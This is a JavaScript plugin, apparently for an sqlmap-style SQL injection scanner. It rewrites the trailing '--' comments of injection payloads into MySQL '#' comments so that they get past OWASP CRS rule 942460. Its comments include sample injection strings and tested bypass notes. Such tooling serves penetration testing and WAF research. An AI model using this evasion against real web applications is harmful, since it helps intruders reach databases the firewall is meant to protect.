// 尾部注释 -- → #：将 payload 尾部的 `-- -`/`--` 行注释统一改为 MySQL `#` 注释
// 背景（2026-09-09 waf-real 实测产出）：OWASP CRS v4.1.0 规则 942460（Meta-Character Anomaly）
// 对「连续 4 个非单词字符」直接拦截 —— `-- -` 恰好是 4 连（`-`、`-`、空格、`-`），
// `/**/` 同样 4 连（这使 space2comment 在严格 CRS 下反而送人头）。而 `#` 仅 1 个非词字符，
// `alice' AND 1=1#` 实测通过严格 CRS 且 MySQL 语法等价。
// 实现说明：只处理**尾部**注释（$ 锚定），不扫描中间注释 —— 注入 payload 中间出现 `--`
// 的场景（如字符串字面量内）语义敏感，而尾部 `-- -` 在注入语义中必为注释终结符。
// 注意不能用引号状态机：注入 payload 的闭合前缀（如 `alice'`）常为奇数引号，
// 状态机会把整段尾部误判为「字符串内」导致漏转换（首版实测踩坑）。
// 对标 sqlmap 语义：与 space2hash（空格→#注释）互补，本插件只改注释符，不动其他内容。
export const dash2hash = {
  name: 'dash2hash',
  description: '将尾部 -- -/-- 行注释替换为 # 注释，绕过 942460（4 连非词字符）类规则',
  // [P3-FIX 2026-09-09] 方言限定：# 行注释是 MySQL 系方言，PG/H2/Derby/Oracle 等不识别，
  // 非限定库上会把合法 SQL 注释改成语法错误（静默产出无效 payload）。
  dbms: ['MySQL', 'MariaDB', 'TiDB'],
  // 标记安全：只替换尾部注释符，不触碰 __S__ / SQLISCANNER<N> 标记
  markerSafe: true,
  transform(payload) {
    const src = String(payload ?? '');
    // 尾部 `--` + 任意注释尾缀（- / 空白）→ `#`
    // 例：`1' AND 1=1-- -` → `1' AND 1=1#`；`1 AND 1=1--` → `1 AND 1=1#`
    const m = src.match(/\s*--[\s\S]*$/);
    if (m && /--/.test(m[0])) {
      // 仅当 `--` 之后无引号（引号意味着可能不是纯注释尾巴）才替换
      const tail = m[0];
      if (!/['"`]/.test(tail)) return src.slice(0, src.length - tail.length) + '#';
    }
    // 已是 # 注释尾部：归一化（去除 # 后冗余空白外的字符不动）
    return src;
  },
};
export default dash2hash;
